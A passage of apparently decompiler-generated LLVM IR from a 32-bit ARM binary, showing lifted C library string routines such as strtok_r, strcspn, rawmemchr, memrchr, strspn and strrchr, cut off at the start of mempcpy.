  %v0_2d940 = phi i32 [ %v1_2d940, %dec_label_pc_2d940 ], [ %v0_2d8f0.lcssa, %dec_label_pc_2d944.preheader ]
  %v0_2d944 = add i32 %v0_2d944.in, -1
  %v1_2d934 = inttoptr i32 %v0_2d940 to i8*
  %v2_2d934 = load i8, i8* %v1_2d934, align 1
  %v3_2d934 = zext i8 %v2_2d934 to i32
  %v9_2d938 = icmp eq i32 %v3_2d934, %v1_2d874
  br i1 %v9_2d938, label %dec_label_pc_2d950, label %dec_label_pc_2d940

dec_label_pc_2d940:                               ; preds = %dec_label_pc_2d934
  %v1_2d940 = add i32 %v0_2d940, 1
  %v2_2d944 = icmp eq i32 %v0_2d944, 0
  br i1 %v2_2d944, label %dec_label_pc_2d94c, label %dec_label_pc_2d934

dec_label_pc_2d94c:                               ; preds = %dec_label_pc_2d940, %dec_label_pc_2d944.preheader
  br label %dec_label_pc_2d950

dec_label_pc_2d950:                               ; preds = %dec_label_pc_2d87c, %dec_label_pc_2d8fc, %dec_label_pc_2d8d4, %dec_label_pc_2d934, %bb36, %bb, %dec_label_pc_2d94c
  %v1_2d954 = phi i32 [ 0, %dec_label_pc_2d94c ], [ %v1_2d8e8, %bb ], [ %v1_2d8e0, %bb36 ], [ %v0_2d940, %dec_label_pc_2d934 ], [ %v1_2d8fc, %dec_label_pc_2d8fc ], [ %v0_2d8f059, %dec_label_pc_2d8d4 ], [ %v0_2d88c, %dec_label_pc_2d87c ]
  ret i32 %v1_2d954

; uselistorder directives
  uselistorder i32 %v1_2d8cc, { 1, 0, 2 }
  uselistorder i32 %v0_2d8f059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_2d8a0, { 1, 0 }
  uselistorder i32 %v0_2d91c22, { 1, 2, 0 }
  uselistorder i32 %v0_2d88c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_2d8a4.pre, { 1, 0 }
  uselistorder i32 %v1_2d874, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_2d950, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_2d91c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_2d8b0, { 1, 0 }
  uselistorder label %dec_label_pc_2d8a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2d898, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_2d960 = load i32, i32* @r4, align 4
  store i32 %v3_2d960, i32* %stack_var_-16, align 4
  %v0_2d964 = load i32, i32* @r0, align 4
  store i32 %v0_2d964, i32* %r4.global-to-local, align 4
  %v2_2d964 = icmp eq i32 %v0_2d964, 0
  %v1_2d968 = load i32, i32* @r2, align 4
  br i1 %v2_2d964, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_2d968 = inttoptr i32 %v1_2d968 to i32*
  %v3_2d968 = load i32, i32* %v2_2d968, align 4
  store i32 %v3_2d968, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_2d96c = phi i32 [ %v3_2d968, %bb ], [ %v0_2d964, %entry ]
  store i32 %v0_2d96c, i32* @r0, align 4
  store i32 %v1_2d968, i32* %r5.global-to-local, align 4
  %v0_2d974 = load i32, i32* @r1, align 4
  store i32 %v0_2d974, i32* %r6.global-to-local, align 4
  %v1_2d978 = inttoptr i32 %v0_2d96c to i8*
  %v2_2d978 = call i32 @__GI_strspn(i8* %v1_2d978)
  %v0_2d97c = load i32, i32* %r4.global-to-local, align 4
  %v2_2d97c = add i32 %v0_2d97c, %v2_2d978
  %v3_2d97c = inttoptr i32 %v2_2d97c to i8*
  %v4_2d97c = load i8, i8* %v3_2d97c, align 1
  %v6_2d97c = zext i8 %v4_2d97c to i32
  store i32 %v6_2d97c, i32* %r3.global-to-local, align 4
  store i32 %v2_2d97c, i32* @r4, align 4
  %v2_2d984 = icmp eq i8 %v4_2d97c, 0
  br i1 %v2_2d984, label %bb8, label %dec_label_pc_2d990

bb8:                                              ; preds = %entry._crit_edge
  %v2_2d988 = load i32, i32* %r5.global-to-local, align 4
  %v3_2d988 = inttoptr i32 %v2_2d988 to i32*
  store i32 %v2_2d97c, i32* %v3_2d988, align 4
  br label %dec_label_pc_2d9cc

dec_label_pc_2d990:                               ; preds = %entry._crit_edge
  %v0_2d990 = load i32, i32* %r6.global-to-local, align 4
  %v3_2d998 = call i32 @__GI_strpbrk(i8* %v3_2d97c, i32 %v0_2d990)
  %v3_2d99c = icmp eq i32 %v3_2d998, 0
  br i1 %v3_2d99c, label %dec_label_pc_2d9a4, label %dec_label_pc_2d9bc

dec_label_pc_2d9a4:                               ; preds = %dec_label_pc_2d990
  %v0_2d9a8 = load i32, i32* @r4, align 4
  store i32 %v0_2d9a8, i32* @r0, align 4
  %v2_2d9ac = call i32 @rawmemchr(i32 %v0_2d9a8, i32 0)
  %v0_2d9b0 = load i32, i32* @r4, align 4
  store i32 %v0_2d9b0, i32* %r3.global-to-local, align 4
  %v1_2d9b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d9b4 = inttoptr i32 %v1_2d9b4 to i32*
  store i32 %v2_2d9ac, i32* %v2_2d9b4, align 4
  br label %dec_label_pc_2d9cc

dec_label_pc_2d9bc:                               ; preds = %dec_label_pc_2d990
  %v4_2d998 = inttoptr i32 %v3_2d998 to i8*
  store i8 0, i8* %v4_2d998, align 1
  %v7_2d9c0 = add i32 %v3_2d998, 1
  %v1_2d9c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_2d9c4 = inttoptr i32 %v1_2d9c4 to i32*
  store i32 %v7_2d9c0, i32* %v2_2d9c4, align 4
  %v0_2d9c8 = load i32, i32* @r4, align 4
  store i32 %v0_2d9c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2d9cc

dec_label_pc_2d9cc:                               ; preds = %bb8, %dec_label_pc_2d9a4, %dec_label_pc_2d9bc
  %v0_2d9cc = load i32, i32* %r3.global-to-local, align 4
  %v2_2d9d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2d9d0, i32* @r4, align 4
  ret i32 %v0_2d9cc

; uselistorder directives
  uselistorder i32 %v3_2d998, { 0, 2, 1 }
  uselistorder i32 %v0_2d96c, { 1, 0 }
  uselistorder i32 %v0_2d964, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_2d9cc, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_2d9d8 = load i32, i32* @r4, align 4
  store i32 %v3_2d9d8, i32* %stack_var_-16, align 4
  %v6_2d9d8 = load i32, i32* @r5, align 4
  %v9_2d9d8 = load i32, i32* @r6, align 4
  %v0_2d9dc = load i32, i32* @r0, align 4
  %v0_2d9e0 = load i32, i32* @r1, align 4
  store i32 %v0_2d9e0, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_2d9fc8 = inttoptr i32 %v0_2d9dc to i8*
  %v2_2d9fc9 = load i8, i8* %v1_2d9fc8, align 1
  %v2_2da0011 = icmp eq i8 %v2_2d9fc9, 0
  store i32 %v0_2d9e0, i32* @r0, align 4
  %v1_2da0812 = add i32 %v0_2d9dc, 1
  store i32 %v1_2da0812, i32* @r4, align 4
  br i1 %v2_2da0011, label %dec_label_pc_2da10, label %dec_label_pc_2d9ec

dec_label_pc_2d9ec:                               ; preds = %entry, %dec_label_pc_2d9f8
  %v3_2d9fc14.in = phi i8 [ %v2_2d9fc, %dec_label_pc_2d9f8 ], [ %v2_2d9fc9, %entry ]
  %v0_2da0413 = phi i32 [ %v0_2da04.pre, %dec_label_pc_2d9f8 ], [ %v0_2d9e0, %entry ]
  %v3_2d9fc14 = zext i8 %v3_2d9fc14.in to i32
  %v2_2d9ec = call i32 @__GI_strchr(i32 %v0_2da0413, i32 %v3_2d9fc14)
  %v2_2d9f0 = icmp eq i32 %v2_2d9ec, 0
  %v0_2d9f8 = load i32, i32* @r5, align 4
  br i1 %v2_2d9f0, label %dec_label_pc_2d9f8, label %dec_label_pc_2da10

dec_label_pc_2d9f8:                               ; preds = %dec_label_pc_2d9ec
  %v1_2d9f8 = add i32 %v0_2d9f8, 1
  %v0_2d9fc.pre = load i32, i32* @r4, align 4
  %v0_2da04.pre = load i32, i32* @r6, align 4
  store i32 %v1_2d9f8, i32* @r5, align 4
  %v1_2d9fc = inttoptr i32 %v0_2d9fc.pre to i8*
  %v2_2d9fc = load i8, i8* %v1_2d9fc, align 1
  %v2_2da00 = icmp eq i8 %v2_2d9fc, 0
  store i32 %v0_2da04.pre, i32* @r0, align 4
  %v1_2da08 = add i32 %v0_2d9fc.pre, 1
  store i32 %v1_2da08, i32* @r4, align 4
  br i1 %v2_2da00, label %dec_label_pc_2da10, label %dec_label_pc_2d9ec

dec_label_pc_2da10:                               ; preds = %dec_label_pc_2d9f8, %dec_label_pc_2d9ec, %entry
  %v0_2da10 = phi i32 [ 0, %entry ], [ %v0_2d9f8, %dec_label_pc_2d9ec ], [ %v1_2d9f8, %dec_label_pc_2d9f8 ]
  %v2_2da14 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2da14, i32* @r4, align 4
  store i32 %v6_2d9d8, i32* @r5, align 4
  store i32 %v9_2d9d8, i32* @r6, align 4
  ret i32 %v0_2da10

; uselistorder directives
  uselistorder i8 %v2_2d9fc, { 1, 0 }
  uselistorder i32 %v0_2da04.pre, { 1, 0 }
  uselistorder i32 %v0_2d9fc.pre, { 1, 0 }
  uselistorder label %dec_label_pc_2d9ec, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_2da20 = urem i32 %arg1, 256
  %v0_2da382 = load i32, i32* @r0, align 4
  %v1_2da383 = urem i32 %v0_2da382, 4
  %v2_2da384 = icmp eq i32 %v1_2da383, 0
  br i1 %v2_2da384, label %dec_label_pc_2da40, label %dec_label_pc_2da28

dec_label_pc_2da28:                               ; preds = %entry, %dec_label_pc_2da34
  %v0_2da34 = phi i32 [ %v1_2da34, %dec_label_pc_2da34 ], [ %v0_2da382, %entry ]
  %v1_2da28 = inttoptr i32 %v0_2da34 to i8*
  %v2_2da28 = load i8, i8* %v1_2da28, align 1
  %v3_2da28 = zext i8 %v2_2da28 to i32
  %v9_2da2c = icmp eq i32 %v3_2da28, %v1_2da20
  br i1 %v9_2da2c, label %dec_label_pc_2dabc, label %dec_label_pc_2da34

dec_label_pc_2da34:                               ; preds = %dec_label_pc_2da28
  %v1_2da34 = add i32 %v0_2da34, 1
  %v1_2da38 = urem i32 %v1_2da34, 4
  %v2_2da38 = icmp eq i32 %v1_2da38, 0
  br i1 %v2_2da38, label %dec_label_pc_2da40, label %dec_label_pc_2da28

dec_label_pc_2da40:                               ; preds = %dec_label_pc_2da34, %entry
  %v0_2da44 = phi i32 [ %v0_2da382, %entry ], [ %v1_2da34, %dec_label_pc_2da34 ]
  %v4_2da40 = mul nuw nsw i32 %v1_2da20, 256
  %v5_2da40 = or i32 %v4_2da40, %v1_2da20
  %v4_2da48 = mul i32 %v5_2da40, 65536
  %v5_2da48 = or i32 %v4_2da48, %v5_2da40
  br label %dec_label_pc_2da4c

dec_label_pc_2da4c:                               ; preds = %dec_label_pc_2daac, %dec_label_pc_2da4c, %dec_label_pc_2da40
  %v0_2da90 = phi i32 [ %v0_2da44, %dec_label_pc_2da40 ], [ %v4_2da4c, %dec_label_pc_2da4c ], [ %v4_2da4c, %dec_label_pc_2daac ]
  %v1_2da4c = inttoptr i32 %v0_2da90 to i32*
  %v2_2da4c = load i32, i32* %v1_2da4c, align 4
  %v4_2da4c = add i32 %v0_2da90, 4
  %v2_2da54 = xor i32 %v2_2da4c, %v5_2da48
  %v2_2da58 = add i32 %v2_2da54, 2130640639
  %v1_2da60 = sub i32 -1, %v2_2da54
  %v2_2da64 = xor i32 %v2_2da58, %v1_2da60
  %v2_2da68 = and i32 %v2_2da64, -2130640640
  %v2_2da6c = icmp eq i32 %v2_2da68, 0
  br i1 %v2_2da6c, label %dec_label_pc_2da4c, label %dec_label_pc_2da74

dec_label_pc_2da74:                               ; preds = %dec_label_pc_2da4c
  %v2_2da74 = inttoptr i32 %v0_2da90 to i8*
  %v3_2da74 = load i8, i8* %v2_2da74, align 1
  %v4_2da74 = zext i8 %v3_2da74 to i32
  %v9_2da7c = icmp eq i32 %v4_2da74, %v1_2da20
  %v1_2da80 = add i32 %v0_2da90, 3
  br i1 %v9_2da7c, label %dec_label_pc_2dabc, label %dec_label_pc_2da88

dec_label_pc_2da88:                               ; preds = %dec_label_pc_2da74
  %v1_2da88 = add i32 %v0_2da90, 1
  %v2_2da88 = inttoptr i32 %v1_2da88 to i8*
  %v3_2da88 = load i8, i8* %v2_2da88, align 1
  %v4_2da88 = zext i8 %v3_2da88 to i32
  %v9_2da8c = icmp eq i32 %v4_2da88, %v1_2da20
  br i1 %v9_2da8c, label %bb, label %dec_label_pc_2da9c

bb:                                               ; preds = %dec_label_pc_2da88
  br label %dec_label_pc_2dabc

dec_label_pc_2da9c:                               ; preds = %dec_label_pc_2da88
  %v1_2da9c = add i32 %v0_2da90, 2
  %v2_2da9c = inttoptr i32 %v1_2da9c to i8*
  %v3_2da9c = load i8, i8* %v2_2da9c, align 1
  %v4_2da9c = zext i8 %v3_2da9c to i32
  %v9_2daa0 = icmp eq i32 %v4_2da9c, %v1_2da20
  br i1 %v9_2daa0, label %dec_label_pc_2dabc, label %dec_label_pc_2daac

dec_label_pc_2daac:                               ; preds = %dec_label_pc_2da9c
  %v2_2daac = inttoptr i32 %v1_2da80 to i8*
  %v3_2daac = load i8, i8* %v2_2daac, align 1
  %v4_2daac = zext i8 %v3_2daac to i32
  %v9_2dab0 = icmp eq i32 %v4_2daac, %v1_2da20
  br i1 %v9_2dab0, label %dec_label_pc_2dab8, label %dec_label_pc_2da4c

dec_label_pc_2dab8:                               ; preds = %dec_label_pc_2daac
  br label %dec_label_pc_2dabc

dec_label_pc_2dabc:                               ; preds = %dec_label_pc_2da28, %dec_label_pc_2da9c, %dec_label_pc_2da74, %bb, %dec_label_pc_2dab8
  %v1_2dac0 = phi i32 [ %v1_2da80, %dec_label_pc_2dab8 ], [ %v1_2da88, %bb ], [ %v1_2da9c, %dec_label_pc_2da9c ], [ %v0_2da90, %dec_label_pc_2da74 ], [ %v0_2da34, %dec_label_pc_2da28 ]
  ret i32 %v1_2dac0

; uselistorder directives
  uselistorder i32 %v4_2da4c, { 1, 0 }
  uselistorder i32 %v0_2da90, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_2da40, { 1, 0 }
  uselistorder i32 %v1_2da34, { 1, 0, 2 }
  uselistorder i32 %v0_2da382, { 2, 1, 0 }
  uselistorder i32 %v1_2da20, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_2dabc, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_2da28, { 1, 0 }
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_2dad0 = urem i32 %arg2, 256
  %v2_2dad4 = add i32 %arg3, %arg1
  %v2_2daec4 = icmp eq i32 %arg3, 0
  br i1 %v2_2daec4, label %dec_label_pc_2dafc, label %dec_label_pc_2daf4

dec_label_pc_2dadc:                               ; preds = %dec_label_pc_2daf4
  %v1_2dadc = add i32 %v0_2dadc, -1
  %v2_2dadc = inttoptr i32 %v1_2dadc to i8*
  %v3_2dadc = load i8, i8* %v2_2dadc, align 1
  %v4_2dadc = zext i8 %v3_2dadc to i32
  %v9_2dae0 = icmp eq i32 %v4_2dadc, %v1_2dad0
  br i1 %v9_2dae0, label %dec_label_pc_2db9c, label %dec_label_pc_2dae8

dec_label_pc_2dae8:                               ; preds = %dec_label_pc_2dadc
  %v1_2dae8 = add i32 %v0_2dae8, -1
  %v2_2daec = icmp eq i32 %v1_2dae8, 0
  br i1 %v2_2daec, label %dec_label_pc_2dafc, label %dec_label_pc_2daf4

dec_label_pc_2daf4:                               ; preds = %entry, %dec_label_pc_2dae8
  %v0_2dae8 = phi i32 [ %v1_2dae8, %dec_label_pc_2dae8 ], [ %arg3, %entry ]
  %v0_2dadc = phi i32 [ %v1_2dadc, %dec_label_pc_2dae8 ], [ %v2_2dad4, %entry ]
  %v1_2daf4 = urem i32 %v0_2dadc, 4
  %v2_2daf4 = icmp eq i32 %v1_2daf4, 0
  br i1 %v2_2daf4, label %dec_label_pc_2dafc, label %dec_label_pc_2dadc

dec_label_pc_2dafc:                               ; preds = %dec_label_pc_2dae8, %dec_label_pc_2daf4, %entry
  %v0_2db8413 = phi i32 [ %v2_2dad4, %entry ], [ %v1_2dadc, %dec_label_pc_2dae8 ], [ %v0_2dadc, %dec_label_pc_2daf4 ]
  %v0_2db709 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_2dae8 ], [ %v0_2dae8, %dec_label_pc_2daf4 ]
  %v4_2dafc = mul nuw nsw i32 %v1_2dad0, 256
  %v5_2dafc = or i32 %v4_2dafc, %v1_2dad0
  %v4_2db00 = mul i32 %v5_2dafc, 65536
  %v5_2db00 = or i32 %v4_2db00, %v5_2dafc
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_2db709, 3
  br i1 %tmp, label %dec_label_pc_2db08, label %dec_label_pc_2db90

dec_label_pc_2db08:                               ; preds = %dec_label_pc_2dafc, %dec_label_pc_2db70.backedge
  %v0_2db2440 = phi i32 [ %v1_2db24, %dec_label_pc_2db70.backedge ], [ %v0_2db709, %dec_label_pc_2dafc ]
  %v0_2db0839 = phi i32 [ %v1_2db08, %dec_label_pc_2db70.backedge ], [ %v0_2db8413, %dec_label_pc_2dafc ]
  %v1_2db08 = add i32 %v0_2db0839, -4
  %v2_2db08 = inttoptr i32 %v1_2db08 to i32*
  %v3_2db08 = load i32, i32* %v2_2db08, align 4
  %v2_2db0c = xor i32 %v3_2db08, %v5_2db00
  %v2_2db10 = add i32 %v2_2db0c, 2130640639
  store i32 %v2_2db10, i32* @ip, align 4
  %v1_2db14 = sub i32 -1, %v2_2db0c
  %v2_2db18 = xor i32 %v2_2db10, %v1_2db14
  %v2_2db1c = and i32 %v2_2db18, -2130640640
  %v2_2db20 = icmp eq i32 %v2_2db1c, 0
  %v1_2db24 = add i32 %v0_2db2440, -4
  br i1 %v2_2db20, label %dec_label_pc_2db70.backedge, label %dec_label_pc_2db2c

dec_label_pc_2db70.backedge:                      ; preds = %dec_label_pc_2db08, %dec_label_pc_2db64
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_2db24, 3
  br i1 %tmp46, label %dec_label_pc_2db08, label %dec_label_pc_2db90

dec_label_pc_2db2c:                               ; preds = %dec_label_pc_2db08
  %v1_2db2c = add i32 %v0_2db0839, -1
  %v2_2db2c = inttoptr i32 %v1_2db2c to i8*
  %v3_2db2c = load i8, i8* %v2_2db2c, align 1
  %v4_2db2c = zext i8 %v3_2db2c to i32
  %v9_2db30 = icmp eq i32 %v4_2db2c, %v1_2dad0
  br i1 %v9_2db30, label %dec_label_pc_2db5c, label %dec_label_pc_2db3c

dec_label_pc_2db3c:                               ; preds = %dec_label_pc_2db2c
  %v1_2db3c = add i32 %v0_2db0839, -2
  %v2_2db3c = inttoptr i32 %v1_2db3c to i8*
  %v3_2db3c = load i8, i8* %v2_2db3c, align 1
  %v4_2db3c = zext i8 %v3_2db3c to i32
  %v9_2db40 = icmp eq i32 %v4_2db3c, %v1_2dad0
  br i1 %v9_2db40, label %dec_label_pc_2db5c, label %dec_label_pc_2db4c

dec_label_pc_2db4c:                               ; preds = %dec_label_pc_2db3c
  %v1_2db4c = add i32 %v0_2db0839, -3
  %v2_2db4c = inttoptr i32 %v1_2db4c to i8*
  %v3_2db4c = load i8, i8* %v2_2db4c, align 1
  %v4_2db4c = zext i8 %v3_2db4c to i32
  %v9_2db50 = icmp eq i32 %v4_2db4c, %v1_2dad0
  br i1 %v9_2db50, label %dec_label_pc_2db5c, label %dec_label_pc_2db64

dec_label_pc_2db5c:                               ; preds = %dec_label_pc_2db4c, %dec_label_pc_2db3c, %dec_label_pc_2db2c
  %v0_2db5c = phi i32 [ %v1_2db4c, %dec_label_pc_2db4c ], [ %v1_2db3c, %dec_label_pc_2db3c ], [ %v1_2db2c, %dec_label_pc_2db2c ]
  br label %dec_label_pc_2db9c

dec_label_pc_2db64:                               ; preds = %dec_label_pc_2db4c
  %v1_2db64 = inttoptr i32 %v1_2db08 to i8*
  %v2_2db64 = load i8, i8* %v1_2db64, align 1
  %v3_2db64 = zext i8 %v2_2db64 to i32
  %v9_2db68 = icmp eq i32 %v3_2db64, %v1_2dad0
  br i1 %v9_2db68, label %dec_label_pc_2db9c, label %dec_label_pc_2db70.backedge

dec_label_pc_2db84:                               ; preds = %dec_label_pc_2db90
  %v1_2db90 = add i32 %v0_2db90, -1
  %v1_2db84 = add i32 %v0_2db84, -1
  %v2_2db84 = inttoptr i32 %v1_2db84 to i8*
  %v3_2db84 = load i8, i8* %v2_2db84, align 1
  %v4_2db84 = zext i8 %v3_2db84 to i32
  %v9_2db88 = icmp eq i32 %v4_2db84, %v1_2dad0
  br i1 %v9_2db88, label %dec_label_pc_2db9c, label %dec_label_pc_2db90

dec_label_pc_2db90:                               ; preds = %dec_label_pc_2dafc, %dec_label_pc_2db70.backedge, %dec_label_pc_2db84
  %v0_2db84 = phi i32 [ %v1_2db84, %dec_label_pc_2db84 ], [ %v0_2db8413, %dec_label_pc_2dafc ], [ %v1_2db08, %dec_label_pc_2db70.backedge ]
  %v0_2db90 = phi i32 [ %v1_2db90, %dec_label_pc_2db84 ], [ %v0_2db709, %dec_label_pc_2dafc ], [ %v1_2db24, %dec_label_pc_2db70.backedge ]
  %v2_2db90 = icmp eq i32 %v0_2db90, 0
  br i1 %v2_2db90, label %dec_label_pc_2db98, label %dec_label_pc_2db84

dec_label_pc_2db98:                               ; preds = %dec_label_pc_2db90
  br label %dec_label_pc_2db9c

dec_label_pc_2db9c:                               ; preds = %dec_label_pc_2dadc, %dec_label_pc_2db64, %dec_label_pc_2db84, %dec_label_pc_2db5c, %dec_label_pc_2db98
  %v1_2dba0 = phi i32 [ %v0_2db5c, %dec_label_pc_2db5c ], [ 0, %dec_label_pc_2db98 ], [ %v1_2db84, %dec_label_pc_2db84 ], [ %v1_2db08, %dec_label_pc_2db64 ], [ %v1_2dadc, %dec_label_pc_2dadc ]
  ret i32 %v1_2dba0

; uselistorder directives
  uselistorder i32 %v0_2db90, { 1, 0 }
  uselistorder i32 %v1_2db24, { 1, 0, 2 }
  uselistorder i32 %v1_2db08, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_2db0839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_2dafc, { 1, 0 }
  uselistorder i32 %v0_2db709, { 1, 2, 0 }
  uselistorder i32 %v0_2dadc, { 1, 0, 2 }
  uselistorder i32 %v2_2dad4, { 1, 0 }
  uselistorder i32 %v1_2dad0, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2db9c, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_2db90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2db70.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_2db08, { 1, 0 }
  uselistorder label %dec_label_pc_2dafc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2daf4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_2dbdc2 = load i32, i32* @r0, align 4
  %v1_2dbdc3 = inttoptr i32 %v0_2dbdc2 to i8*
  %v2_2dbdc4 = load i8, i8* %v1_2dbdc3, align 1
  %v3_2dbdc5 = zext i8 %v2_2dbdc4 to i32
  store i32 %v3_2dbdc5, i32* @ip, align 4
  %v2_2dbe06 = icmp eq i8 %v2_2dbdc4, 0
  br i1 %v2_2dbe06, label %dec_label_pc_2dbec, label %dec_label_pc_2dbc0.preheader

dec_label_pc_2dbb8:                               ; preds = %dec_label_pc_2dbc0
  %v3_2dbc0 = zext i8 %v2_2dbc0 to i32
  %v1_2dbc8 = add i32 %v0_2dbc8, 1
  %v9_2dbb8 = icmp eq i32 %v0_2dbb810, %v3_2dbc0
  br i1 %v9_2dbb8, label %dec_label_pc_2dbd4, label %dec_label_pc_2dbc0

dec_label_pc_2dbc0:                               ; preds = %dec_label_pc_2dbc0.preheader, %dec_label_pc_2dbb8
  %v0_2dbc8 = phi i32 [ %tmp, %dec_label_pc_2dbc0.preheader ], [ %v1_2dbc8, %dec_label_pc_2dbb8 ]
  %v1_2dbc0 = inttoptr i32 %v0_2dbc8 to i8*
  %v2_2dbc0 = load i8, i8* %v1_2dbc0, align 1
  %v2_2dbc4 = icmp eq i8 %v2_2dbc0, 0
  br i1 %v2_2dbc4, label %dec_label_pc_2dbec, label %dec_label_pc_2dbb8

dec_label_pc_2dbd4:                               ; preds = %dec_label_pc_2dbb8
  %v1_2dbd4 = add i32 %v0_2dbd4, 1
  %v1_2dbd8 = add i32 %v0_2dbd8, 1
  %v1_2dbdc = inttoptr i32 %v1_2dbd8 to i8*
  %v2_2dbdc = load i8, i8* %v1_2dbdc, align 1
  %v3_2dbdc = zext i8 %v2_2dbdc to i32
  store i32 %v3_2dbdc, i32* @ip, align 4
  %v2_2dbe0 = icmp eq i8 %v2_2dbdc, 0
  br i1 %v2_2dbe0, label %dec_label_pc_2dbec, label %dec_label_pc_2dbc0.preheader

dec_label_pc_2dbc0.preheader:                     ; preds = %entry, %dec_label_pc_2dbd4
  %v0_2dbd8 = phi i32 [ %v1_2dbd8, %dec_label_pc_2dbd4 ], [ %v0_2dbdc2, %entry ]
  %v0_2dbd4 = phi i32 [ %v1_2dbd4, %dec_label_pc_2dbd4 ], [ 0, %entry ]
  %v0_2dbb810 = phi i32 [ %v3_2dbdc, %dec_label_pc_2dbd4 ], [ %v3_2dbdc5, %entry ]
  br label %dec_label_pc_2dbc0

dec_label_pc_2dbec:                               ; preds = %dec_label_pc_2dbd4, %dec_label_pc_2dbc0, %entry
  %v0_2dbec = phi i32 [ 0, %entry ], [ %v0_2dbd4, %dec_label_pc_2dbc0 ], [ %v1_2dbd4, %dec_label_pc_2dbd4 ]
  ret i32 %v0_2dbec

; uselistorder directives
  uselistorder i32 %v0_2dbc8, { 1, 0 }
  uselistorder label %dec_label_pc_2dbc0.preheader, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_2dbfc = urem i32 %arg2, 256
  store i32 %v1_2dbfc, i32* @r4, align 4
  %v2_2dbfc = icmp eq i32 %v1_2dbfc, 0
  br i1 %v2_2dbfc, label %dec_label_pc_2dc10, label %dec_label_pc_2dc24.preheader

dec_label_pc_2dc24.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_2dc2c3 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_2dbfc)
  %v2_2dc305 = icmp eq i32 %v2_2dc2c3, 0
  br i1 %v2_2dc305, label %dec_label_pc_2dc38, label %dec_label_pc_2dc1c

dec_label_pc_2dc10:                               ; preds = %entry
  %v2_2dc14 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_2dc3c

dec_label_pc_2dc1c:                               ; preds = %dec_label_pc_2dc24.preheader, %dec_label_pc_2dc1c
  %v2_2dc2c6 = phi i32 [ %v2_2dc2c, %dec_label_pc_2dc1c ], [ %v2_2dc2c3, %dec_label_pc_2dc24.preheader ]
  store i32 %v2_2dc2c6, i32* @r5, align 4
  %v1_2dc20 = add i32 %v2_2dc2c6, 1
  store i32 %v1_2dc20, i32* @r0, align 4
  %v0_2dc28 = load i32, i32* @r4, align 4
  %v2_2dc2c = call i32 @__GI_strchr(i32 %v1_2dc20, i32 %v0_2dc28)
  %v2_2dc30 = icmp eq i32 %v2_2dc2c, 0
  br i1 %v2_2dc30, label %dec_label_pc_2dc38, label %dec_label_pc_2dc1c

dec_label_pc_2dc38:                               ; preds = %dec_label_pc_2dc1c, %dec_label_pc_2dc24.preheader
  %v0_2dc38 = load i32, i32* @r5, align 4
  br label %dec_label_pc_2dc3c

dec_label_pc_2dc3c:                               ; preds = %dec_label_pc_2dc10, %dec_label_pc_2dc38
  %storemerge = phi i32 [ %v2_2dc14, %dec_label_pc_2dc10 ], [ %v0_2dc38, %dec_label_pc_2dc38 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_2dc2c, { 1, 0 }
  uselistorder i32 %v1_2dc20, { 1, 0 }
  uselistorder i32 %v1_2dbfc, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_2dc3c, { 1, 0 }
  uselistorder label %dec_label_pc_2dc1c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
